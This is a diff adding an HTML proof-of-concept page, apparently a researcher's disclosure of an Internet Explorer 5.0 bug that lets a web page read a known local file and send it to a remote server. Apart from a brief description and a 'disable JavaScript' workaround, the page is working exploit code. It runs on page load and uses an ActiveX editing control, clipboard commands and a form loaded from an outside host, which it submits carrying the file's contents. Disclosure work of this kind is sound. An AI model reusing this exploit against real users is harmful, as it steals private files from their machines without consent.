@@ -1,0 +1,54 @@
+<HTML><HEAD><TITLE>IE 5.0 file reading</TITLE>
+</HEAD>
+<BODY>
+There is a bug in Internet Explorer 5.0 which allows reading and sending local files.
+<BR>
+The file name must be known.
+<BR>
+Thanks to Juan Cuartango for his exploits, which helped me a lot for discovering this vulnerability!
+<BR>
+Written by <A HREF="http://www.nat.bg/~joro">Georgi Guninski</A>
+<BR>
+Workaround: Disable JavaScript
+<BR>
+<BR>
+<INPUT TYPE=TEXT ID=A1 VALUE="C:\TEST.TXT">
+
+<SCRIPT>
+
+function f1()
+{
+
+
+document.all.A1.select();
+document.execCommand("copy");
+
+dh.DOM.forms(0).elements(0).focus();
+dh.execCommand(5032);
+setTimeout("dh.DOM.forms(0).submit();",1000);
+
+
+
+}
+
+function f()
+{
+alert("Create a file C:\\test.txt and it will be read and shown in another window \n You may need to wait some time");
+dh.loadURL("http://www.nat.bg/~joro/form3.html");
+setTimeout("f1()",2000);
+}
+
+setTimeout("f();",1000);
+
+</SCRIPT>
+
+
+
+
+<OBJECT classid=clsid:2D360201-FFF5-11d1-8D03-00A0C959BC0A height=100 id=dh 
+width=700>
+</OBJECT>
+
+
+</BODY>
+</HTML>
